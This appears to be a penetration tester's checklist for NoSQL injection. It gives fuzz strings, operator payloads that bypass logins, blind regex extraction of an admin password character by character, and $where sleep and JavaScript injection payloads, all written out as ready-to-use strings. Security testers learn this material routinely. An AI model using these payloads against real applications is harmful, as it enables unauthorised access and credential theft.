# NoSQL Injection

## Checks

- [ ] Fuzz for vulnerable implementation

Fuzz strings

```
'"`{
;$Foo}
$Foo \xYZ
```

Or

```
'%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```

For injecting into a JSON property

```
'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
```

- [ ] Check Conditionals

```
' && 0 && 'x
' && 1 && 'x
```

- [ ] Try to override existing conditions

```
'||'1'=='1
```

Can also try using a null character after the query string

```
?category=fizzy'%00
```

## Operator Injection

```
{"username":{"$ne":"invalid"}}
```

For URL-based inputs

```
username[$ne]=invalid
```

Testing with a known set of usernames:

```
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```

Using regex

```
{"$regex":"admin.*"}
```

## Blind Data Extraction

### Boolean-Based (extracting password character by character)

```json
{"username":"admin","password":{"$regex":"^a"}}
{"username":"admin","password":{"$regex":"^ab"}}
{"username":"admin","password":{"$regex":"^abc"}}
```

Automate by checking response length/status differences.

### Time-Based

Check if the NoSQL engine supports `$where` with JavaScript:

```json
{"$where":"sleep(5000)"}
{"$where":"this.username == 'admin' && sleep(5000)"}
```

## Common Operators

| Operator  | Description   | Example                                 |
| --------- | ------------- | --------------------------------------- |
| `$ne`     | Not equal     | `{"password":{"$ne":""}}`               |
| `$gt`     | Greater than  | `{"password":{"$gt":""}}`               |
| `$regex`  | Regex match   | `{"username":{"$regex":"^adm"}}`        |
| `$in`     | In array      | `{"username":{"$in":["admin","root"]}}` |
| `$nin`    | Not in array  | `{"username":{"$nin":[]}}`              |
| `$exists` | Field exists  | `{"password":{"$exists":true}}`         |
| `$where`  | JS expression | `{"$where":"this.password.length > 0"}` |

## Server-Side JavaScript Injection

If `$where` is supported:

```json
{
  "$where": "function(){return this.username == 'admin' && this.password.startsWith('a')}"
}
```

---

## References

- [PayloadsAllTheThings - NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
- [HackTricks - NoSQL Injection](https://book.hacktricks.wiki/en/pentesting-web/nosql-injection.html)
- [PortSwigger - NoSQL Injection](https://portswigger.net/web-security/nosql-injection)
